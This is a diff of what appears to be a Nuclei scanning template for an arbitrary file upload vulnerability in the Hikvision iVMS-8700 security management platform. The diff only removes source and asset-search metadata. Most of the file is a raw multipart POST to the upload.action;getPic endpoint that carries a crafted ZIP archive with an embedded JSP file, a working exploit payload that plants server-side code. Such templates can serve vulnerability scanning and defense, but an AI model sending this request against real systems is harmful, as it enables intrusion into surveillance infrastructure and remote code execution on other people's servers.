@@ -3,14 +3,8 @@ info:
   name: 海康威视iVMS-8700综合安防管理平台getPic任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/435b5f2354ef680753574681d64eb62a
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 435b5f2354ef680753574681d64eb62a
-    fofa: + hunter：`web.body="/views/home/file/installPackage.rar"`||`web.body="/home/locationIndex.action"`
 http:
 - raw:
   - "POST /msp/home/upload.action;getPic?&type=ios HTTP/1.1\nAccept-Encoding: gzip, deflate\nUser-Agent: MicroMessenger\nContent-Type: multipart/form-data; boundary=00content0boundary00\nHost: {{Hostname}}\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\nContent-Length: 1288\nConnection: close\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"type\"\n\nios\n--00content0boundary00\nContent-Disposition: form-data; name=\"file\"; filename=\"stc.ipa\"\n\nPK\x03\x04\x14\0\0\0\0\0z¦nW\0\0\0\0\0\0\0\0\0\0\0\0\n\0\0\0test1/test/PK\x03\x04\x14\0\0\0\0\x05xäVM(?jù\0\0\0\x04\x18\0\0\x14\0\0\0test1/test/.DS_Storeí\x98ÁJÃ@\x14Eï\x8C\x11\x02º\x98¥Ë|\x81Ð?\x88e\x04\x97BÀµÖJ]¤M(ê:\x7F¦ÿãO4\x99¹¥-\n¡Ýµô\x9E,Î\x84÷&y$$ó\x18\0fü=\n\x01®\n¦\x886í`\x0FÆ{C\x96¾î&\x87k| Ä\x13<îñ\x86ó «ý\x16Ïmå_XîÔ_£.g£â½\x9A×ëä¡Üyåý¤¬&|X\x7F/ÿ¿\x0FÃùÓ£òëÏÃkù)\x96\x8B²ZÌÂ{\x11B!v1\\ßo \x84\x10ûÿ\x87\x8CÎé&Ú0nédk\x8E£3:§\x9Bàö\x88¶tB§´£3:§\x9BhÃûX:¡SÚÑ\x19\x9DCÑÃU\x94ëÖÿÇð\t\t!.\n\x93øÂ\x8F\a6\x8B,\e\x81×p¶i\x04ú\x9A\0\e÷³îº±\x1A\x01!N\x93\x15PK\x03\x04\x14\0\0\0\0\0\x92¦nW\0\0\0\0\0\0\0\0\0\0\0\0\x18\0\0\0test1/test/PetrelHD.app/PK\x03\x04\x14\0\0\0\0Ó¤nW¦\në\ed\0\0\0j\0\0\0\x14\0\0\0test1/test/ceshi.jsp\nÈM\nÂ@\n\x06Ð«¸)L\\\x84R« \x15\x97®EO\x10ôC#af\x9C¦íõû³|ïR¥Á9\x17\x8Dn1´ÍùtÜ·us¨©\x8B\x98v?\x19\n5ñM\nAr6}\x89k\x8Aü\x81? v\x17ÿ\x86\x82ÿ\x80Þ×{¢\x8C\x06ß\x9A\x88ø\x8DEÔU×\x19PK\x03\x04\x14\0\0\0\0\0t¦nW\0\0\0\0\0\0\0\0\0\0\0\0\x06\0\0\0test1/PK\x01\x02?\0\x14\0\0\0\0\0z¦nW\0\0\0\0\0\0\0\0\0\0\0\0\n\0$\0\0\0\0\0\0\0\x10\0\0\0\0\0\0test1/test/\n\0 \0\0\0\0\0\x01\0\x18\0\x9Có¯Uù\x16Ú\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0PK\x01\x02?\0\x14\0\0\0\0\x05xäVM(?jù\0\0\0\x04\x18\0\0\x14\0$\0\0\0\0\0\0\0\x80\0\0\0)\0\0\0test1/test/.DS_Store\n\0 \0\0\0\0\0\x01\0\x18\0\0¹\x19,E®Ù\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0PK\x01\x02?\0\x14\0\0\0\0\0\x92¦nW\0\0\0\0\0\0\0\0\0\0\0\0\x18\0$\0\0\0\0\0\0\00\0\0\0T\x01\0\0test1/test/PetrelHD.app/\n\0 \0\0\0\0\0\x01\0\x18\0Ð\x9D!pù\x16Ú\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0PK\x01\x02?\0\x14\0\0\0\0Ó¤nW¦\në\ed\0\0\0j\0\0\0\x14\0$\0\0\0\0\0\0\0 \0\0\x8A\x01\0\0test1/test/ceshi.jsp\n\0 \0\0\0\0\0\x01\0\x18\0ö¨Ë|÷\x16Ú\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0PK\x01\x02?\0\x14\0\0\0\0\0t¦nW\0\0\0\0\0\0\0\0\0\0\0\0\x06\0$\0\0\0\0\0\0\0\x10\0\0\0 \x02\0\0test1/\n\0 \0\0\0\0\0\x01\0\x18\0*|{Nù\x16Ú\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0PK\x05\x06\0\0\0\0\x05\0\x05\0ë\x01\0\0D\x02\0\0\0\0\n--00content0boundary00--"
